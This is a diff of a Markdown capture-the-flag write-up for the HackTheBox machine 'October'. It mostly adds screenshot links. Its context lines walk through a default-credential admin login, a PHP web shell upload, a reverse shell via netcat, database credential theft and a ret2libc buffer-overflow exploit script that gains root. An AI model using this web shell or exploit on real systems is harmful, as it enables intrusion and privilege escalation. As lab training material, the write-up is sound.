@@ -1,5 +1,5 @@
 # October [HTB](https://app.hackthebox.com/machines/15)
-![october-01]()
+![october-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/october-01.png)
 
 ## Recon
 
@@ -9,7 +9,7 @@ After adding the target to my `/etc/hosts` file I start scanning for open ports:
 nmap -p- --min-rate 10000 october.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/ports-02.png)
 
 
 From here, I send `nmap` to start probing the found ports for more info:
@@ -18,7 +18,7 @@ From here, I send `nmap` to start probing the found ports for more info:
 nmap -p 22,80 -sCV october.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/nmap-res-03.png)
 
 We have the following:
 
@@ -36,7 +36,7 @@ Let's have a look!
 
 Browsing towards `http://october.htb` returns the following page:
 
-![site-04]()
+![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/site-04.png)
 
 
 We can see three main links on the home page, each leads to it's own dedicated directory of `/account`, `/blog` & `/forum`. Based on the title of the page, we can guess that the website is powered by [October CMS](https://en.wikipedia.org/wiki/October_(CMS)), which is an open source PHP based CMS, the source code can be found on [thier Github](https://github.com/octobercms/october).
@@ -44,12 +44,12 @@ We can see three main links on the home page, each leads to it's own dedicated d
 
 After making a request to the site, the server gives us with the following cookie: 
 
-![cookie-05]()
+![cookie-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/cookie-05.png)
 
 
 The `october_session` cookie is a base64 encoded string. Decoding it results in the following:
 
-![decode-06]()
+![decode-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/decode-06.png)
 
 
 We can see a JSON object with the keys: `iv`, `value` & `mac`. The first two keys hold another base64 encoded string, though decoding them returns waht looks like cipher text. The `mac` value is actually a SHA256 digest, though trying to crack it with hashcat or looking it up at [crackstation](https://crackstation.net/) fails. So it's unclear at the moment if we can exploit this cookie. 
@@ -60,7 +60,7 @@ At this point I started interacting with the website itself, I went over the Git
 
 Then, I started checking the resources availble on the main page of the site. I found that the `/blog` & `/forum` pages are fairly empty. The `/account` page has a login and a sign up form:
 
-![account-page-07]()
+![account-page-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/account-page-07.png)
 
 
 Trying a few basic credentials like `admin : admin`, `october : passwd` failed. I also tried creating an account, though this didn't change the sites behaviour at all.  
@@ -71,12 +71,12 @@ At this point I started searching online for ways of exploitng the October CMS, 
 
 In section 5, they mention that the admin area could be located at `http://october.htb/backend/cms`, and indeed if we open this URL we get redirected to an admin login page:
 
-![admin-page-08]()
+![admin-page-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/admin-page-08.png)
 
 
 My first attempt of `admin : admin` worked:
 
-![admin-area-09]()
+![admin-area-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/admin-area-09.png)
 
 
 ### Admin Area
@@ -90,17 +90,17 @@ To start, I create a simple web shell using:
 echo "<?php system(\$_GET['x']); ?>" > htb.php5
 ```
 
-![create-10]()
+![create-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/create-10.png)
 
 
 Then, in the admin panel I click on `Media` -> `Upload`, and select my PHP web shell:
 
-![upload-11]()
+![upload-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/upload-11.png)
 
 
 From here, we can interact with our webshell at `http://october.htb/storage/app/media/htb.php5` to get RCE:
 
-![rce-12]()
+![rce-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/rce-12.png)
 
 
 Now I use Burp's encoder to URL encode the following payload for a reverse shell:
@@ -117,7 +117,7 @@ rlwrap nc -lnvp 443
 
 And send my reverse shell payload to the target using `curl` and I get a shell:
 
-![shell-13]()
+![shell-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/shell-13.png)
 
 
 ## Privilege Escalation
@@ -131,7 +131,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 Then I start going through the October CMS installation files. I know that there is a `/config/database.php` script that should contain credentials to a backend database, so I immediately go for it:
 
-![database-creds-14]()
+![database-creds-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/database-creds-14.png)
 
 
 We can see the credentials to a MySQL database. Lcukliy, the target has the `mysql` command installed so we connect to the database using: 
@@ -140,22 +140,22 @@ We can see the credentials to a MySQL database. Lcukliy, the target has the `mys
 mysql -h 127.0.0.1 -u "october" -D "october" -p
 ```
 
-![db-14]()
+![db-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/db-14.png)
 
 
 The `october` table is the only custom table on the server, so I select it and list all the tables:
 
-![tables-15]()
+![tables-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/tables-15.png)
 
 
 The `backend_users` looks the most interesting, so I dump everything from it:
 
-![dump-16]()
+![dump-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/dump-16.png)
 
 
 We see two user accounts of `harry` & `admin`, the former is actually a user on the system:
 
-![users-17]()
+![users-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/users-17.png)
 
 
 If we [identify](https://hashes.com/en/tools/hash_identifier) the hashes we will find that they are Blowfish hashes. 
@@ -176,12 +176,12 @@ While hashcat was running I kept looking around the filesystem until I saw an in
 find / -perm -4000 2>/dev/null | tail -1
 ```
 
-![suid-18]()
+![suid-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/suid-18.png)
 
 
 If we check the file's permissions we can see root is the owner:
 
-![ll-19]()
+![ll-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/ll-19.png)
 
 
 The name of the file is a strong hint for buffer-overflow, I transfer this file by starting a local netcat listener on my atack machine:
@@ -204,12 +204,12 @@ Once I got the file over to my attack machine I start analyzing it. Let's run `r
 readelf -h ovflw
 ```
 
-![readelf-20]()
+![readelf-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/readelf-20.png)
 
 
 We can see it's a 32-bit executable binary in little endian format. From here, I run it a couple of times and find that an input of around 125 bytes causes a segmentation fault:
 
-![crash-21]()
+![crash-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/crashed-21.png)
 
 
 So it is vulnerable to buffer overflows. 
@@ -217,7 +217,7 @@ So it is vulnerable to buffer overflows.
 
 I then run `checksec` on the binary to idenfify any protection it may have:
 
-![checksec-21.5]()
+![checksec-21.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/checksec-21.5.png)
 
 
 NX means that the stack is not executable, so we can't write our shell code right after the EIP register, rather we need to find the memory address of the `system()` function so we can execute something else. 
@@ -225,7 +225,7 @@ NX means that the stack is not executable, so we can't write our shell code righ
 
 Let's see if the binary has ASLR enabled:
 
-![aslr-22]()
+![aslr-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/aslr-22.png)
 
 
 We can see that the ASLR is enabled in the kernel, and running `ldd` shows that the address of `libc` changes each time. So to exploit this binary we need to think about a [retrun2libc attack](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc). 
@@ -288,12 +288,12 @@ end
 
 Then, I copy the output pattern from pattern_create, and run the binary supplying the pattern I copied:
 
-![eip-23]()
+![eip-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/crashed-eip-23.png)
 
 
 We can see the binary crahsed because we overwrote the EIP with an invalid return address. Now I use the function we defined earlier to get the ASCII value in the EIP register:
 
-![value-eip-24]()
+![value-eip-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/value-eip-24.png)
 
 
 And supply the EIP value to `pattern_offset` to get the offset value to the EIP register:
@@ -303,7 +303,7 @@ alias pattern_offset=/usr/share/metasploit-framework/tools/exploit/pattern_offse
 pattern_offset -q d7Ad
 ```
 
-![match-25]()
+![match-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/match-25.png)
 
 
 Now that we got control over the EIP, we need to find the offset values of the gadgets againts the targte's libc version. 
@@ -311,7 +311,7 @@ Now that we got control over the EIP, we need to find the offset values of the g
 
 Let's start with the libc base address, for that we can use `ldd`:
 
-![ldd-26]()
+![ldd-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/ldd-26.png)
 
 
 For `/bin/sh` we can use `strings`:
@@ -320,7 +320,7 @@ For `/bin/sh` we can use `strings`:
 strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 ```
 
-![strings-27]()
+![strings-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/strings-27.png)
 
 
 To find the values for the `system()` and `exit()` functions, we can use `readelf`:
@@ -329,8 +329,7 @@ To find the values for the `system()` and `exit()` functions, we can use `readel
 readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
 ```
 
-![values-28]()
-
+![values-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/values-28.png)
 
 So here are all the offset values we need:
 
@@ -372,7 +371,6 @@ payload += struct.pack("<I",binsh_addr)
 sys.stdout.write(payload)
 ``` 
 
-
 I host the exploit up using a python web server:
 
 ```python
@@ -394,4 +392,4 @@ while true; do echo -ne "."; ovrflw $(/tmp/exploit.py); done
 
 After a few seconds I get a shell:
 
-![root-29]()
+![root-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/root-29.png)
